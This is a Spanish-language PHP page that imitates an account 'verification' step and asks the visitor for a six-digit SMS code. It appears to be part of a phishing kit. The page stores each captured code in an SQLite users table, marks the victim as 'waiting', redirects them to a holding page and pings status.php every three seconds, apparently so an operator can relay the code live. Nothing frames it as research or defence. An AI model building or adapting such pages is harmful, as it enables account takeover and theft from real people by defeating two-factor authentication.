<?php
$id = $_GET['id'] ?? null;
if (!$id) {
    die("ID de usuario no especificado");
}

$error = "";
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $token = trim($_POST['token'] ?? '');

    if (preg_match('/^\d{6}$/', $token)) {
        try {
            $db = new PDO('sqlite:usuarios.db');
            $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

            $stmt = $db->prepare("UPDATE usuarios SET token = ?, estado = 'esperando' WHERE id = ?");
            $stmt->execute([$token, $id]);

            header("Location: esperando.php?id=" . urlencode($id));
            exit;
        } catch (PDOException $e) {
            $error = "Error al guardar token: " . $e->getMessage();
        }
    } else {
        $error = "El código debe tener 6 dígitos.";
    }
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Verificación</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            margin: 0;
            background-color: #f8fafd;
            font-family: 'Segoe UI', sans-serif;
        }

        .top-bar {
            background-color: #fff;
            padding: 1rem;
            display: flex;
            justify-content: flex-end;
            align-items: center;
            border-bottom: 1px solid #e5e7eb;
        }

        .top-bar a {
            color: #1d4ed8;
            text-decoration: none;
            font-weight: 500;
        }

        .top-bar a::after {
            content: ' ✕';
            font-weight: normal;
            color: #1d4ed8;
        }

        .wrapper {
            display: flex;
            flex-direction: column;
            align-items: center;
            padding-top: 2rem;
        }

        .titulo-externo {
            font-size: 1.25rem;
            font-weight: 600;
            color: #111;
            margin-bottom: 1rem;
            width: 100%;
            max-width: 400px;
            padding-left: 1rem;
        }

        .container {
            background-color: white;
            padding: 2rem;
            border-radius: 1rem;
            box-shadow: 0 0 10px rgba(0,0,0,0.05);
            max-width: 400px;
            width: 100%;
        }

        .section {
            display: flex;
            align-items: center;
            gap: 0.5rem;
            margin-bottom: 0.75rem;
        }

        .section svg {
            width: 20px;
            height: 20px;
            color: #111;
        }

        .section-title {
            font-weight: bold;
            color: #111;
        }

        .description {
            font-size: 0.9rem;
            color: #555;
            margin-bottom: 1.5rem;
        }

        .inputs {
    display: flex;
    gap: 0.4rem;
    justify-content: flex-start; /* <-- Esto los alinea a la izquierda */
    margin-bottom: 1rem;
    width: 100%;
    max-width: 400px;
}


        .inputs input {
            width: 2rem;
            height: 2rem;
            text-align: center;
            font-size: 1rem;
            border: 1px solid #ccc;
            border-radius: 0.4rem;
        }

        .inputs input:focus {
            border-color: #2563eb;
            outline: none;
        }

        .submit-btn {
            padding: 0.5rem 1.2rem;
            font-size: 0.95rem;
            font-weight: 600;
            border: none;
            border-radius: 1.5rem;
            background-color: #e5e7eb;
            color: #6b7280;
            cursor: not-allowed;
            transition: all 0.2s;
            display: inline-block;
        }

        .submit-btn.active {
            background-color: #2563eb;
            color: white;
            cursor: pointer;
        }

        .error {
            background-color: #fef2f2;
            color: #b91c1c;
            padding: 0.75rem;
            border-radius: 0.5rem;
            font-size: 0.875rem;
            margin-bottom: 1rem;
            text-align: center;
        }
    </style>
</head>
<body>

<div class="top-bar">
    <a href="#">Abandonar</a>
</div>

<div class="wrapper">
    <div class="titulo-externo">Verifiquemos que seas tú</div>

    <form method="POST">
        <div class="container">
            <div class="section">
                <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                          d="M16 7a4 4 0 00-8 0v4h8V7zM5 11h14a2 2 0 012 2v6a2 2 0 01-2 2H5a2 2 0 01-2-2v-6a2 2 0 012-2z"/>
                </svg>
                <span class="section-title">Código de verificación</span>
            </div>
            <p class="description">
                Para ayudar a mantener tu cuenta segura, enviaremos un código de verificación a tu celular registrado
            </p>

            <?php if ($error): ?>
                <div class="error"><?= htmlspecialchars($error) ?></div>
            <?php endif; ?>

            <input type="hidden" name="token" id="tokenInput">
            <div class="inputs">
                <input type="text" maxlength="1" class="digit" inputmode="numeric">
                <input type="text" maxlength="1" class="digit" inputmode="numeric">
                <input type="text" maxlength="1" class="digit" inputmode="numeric">
                <input type="text" maxlength="1" class="digit" inputmode="numeric">
                <input type="text" maxlength="1" class="digit" inputmode="numeric">
                <input type="text" maxlength="1" class="digit" inputmode="numeric">
            </div>

            <button type="submit" class="submit-btn" id="submitBtn" disabled>Verificar</button>
        </div>
    </form>
</div>

<script>
    const digits = document.querySelectorAll('.digit');
    const tokenInput = document.getElementById('tokenInput');
    const submitBtn = document.getElementById('submitBtn');

    let code = Array(6).fill('');

    digits.forEach((input, index) => {
        input.addEventListener('input', (e) => {
            const value = e.target.value.replace(/\D/g, '');
            input.value = value;
            code[index] = value;
            if (value && index < digits.length - 1) {
                digits[index + 1].focus();
            }
            updateToken();
        });

        input.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && !code[index] && index > 0) {
                digits[index - 1].focus();
            }
        });
    });

    function updateToken() {
        const joined = code.join('');
        tokenInput.value = joined;
        const complete = joined.length === 6 && /^\d{6}$/.test(joined);
        submitBtn.disabled = !complete;
        submitBtn.classList.toggle('active', complete);
    }
    // 👇 Define el ID del usuario (debes asegurarte de pasarlo desde PHP con JavaScript)
    const idUsuario = <?php echo json_encode($_GET['id'] ?? ''); ?>;

    function enviarPing() {
        if (!idUsuario) return;
        fetch("status.php", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ userId: idUsuario })
        });
    }

    setInterval(enviarPing, 3000); // Ping cada 3 segundos
    enviarPing(); // Enviar inmediatamente al cargar
</script>

</body>
</html>
